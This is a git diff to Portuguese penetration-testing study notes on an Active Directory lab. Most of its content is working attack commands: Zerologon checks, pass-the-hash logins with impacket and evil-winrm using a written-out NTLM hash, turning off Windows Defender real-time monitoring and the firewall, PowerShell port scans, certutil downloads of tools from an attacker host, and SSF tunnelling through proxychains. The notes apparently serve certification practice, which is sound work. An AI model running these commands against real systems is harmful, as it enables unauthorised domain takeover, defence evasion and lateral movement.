@@ -7107,7 +7107,7 @@ Script nmap que anumera usuários do Active Directory AD `krb5-enum-users` na po
 
 - Laboratório do AD
 
-IP 253 é o AD
+IP 253 é o AD [FullNotes](/lab-ad-pplus.md)
 
 	crackmapexec smb 192.168.200.253 -L
 	crackmapexec smb 192.168.200.253 -M zerologon
@@ -7117,16 +7117,32 @@ IP 253 é o AD
 	impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2' offsec.corp/administrator@192.168.200.253 (joga executavel)
 	impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2' offsec.corp/administrator@192.168.200.253 ipconfig (roda comando)
 	vil-winrm -H 'f2535a22448907ddffad7bddef5c53e2' -u administrator -i 192.168.200.253 (fecha uma shell)
-	No servidor WIN - Abaixa desabilita o monitoramento em tempo real do windows defender
+	No SERVIDOR AD- Abaixa desabilita o monitoramento em tempo real do windows defender
  	get-mppreference | findstr Monitoring (Se o resultado for FALSE)
 	set-mppreference -disablerealtimemonitoring $true (Seta como true)
-	impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2" "offsec.corp/administrator"@192.168.200.253 (com o FW desabiltiado funciona)
+	NO ATACANTE impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2" "offsec.corp/administrator"@192.168.200.253 (com o FW desabiltiado funciona)
+	netsh advfirewall set allprofiles state off (desabilita firewall para todos)
+	1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null (faz um portscan 1024, rodar no winrm)
+ 	wget https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4PortScanner/refs/heads/main/Scripts/IPv4PortScan.ps1 (binario para scan de porta)
+	certutil -urlcache -f http://192.168.200.133/IPv4PortScan.ps1 IPv4PortScan.ps1
+	PS .\IPv4PortScan.ps1 -computer 192.168.200.252 -StartPort 445 -EndPort 445 (scan de portas)
+	CMD powershell -c ".\IPv4PortScan.ps1 -computer 192.168.200.252 -StartPort 445 -EndPort 445" (scan de portas)
+	baixa do site (https://securesocketfunneling.github.io/ssf/#download)
+	certutil -urlcache -f http://192.168.200.133/ssf.zip ssf.zip
+	expand-archive ssf.zip -destinationpath ssf
+	-- roda pra escutar no windows AD conectando com o 223
+ 	-- roda no kali escutando a conexão usado o ssf no kali
+	proxychains -q 
 	
 	
+	
+
 
 - Teorias
 
 Spoofing é o ato de falsificar algo
+
+LOBAS - Usar recurso do proprio sistema para fins maliciosos [LOBAS](https://lolbas-project.github.io/#)
 
 LFI - O arquivo ta na maquina da vitima
 RFI - O Arquivo pode ser acessado atravez de um paramentro em uma maquina remota `param?http://localhost/shell.php` O mesmo nao pode passar parâmetro, pois quebra a URL por conta do ?
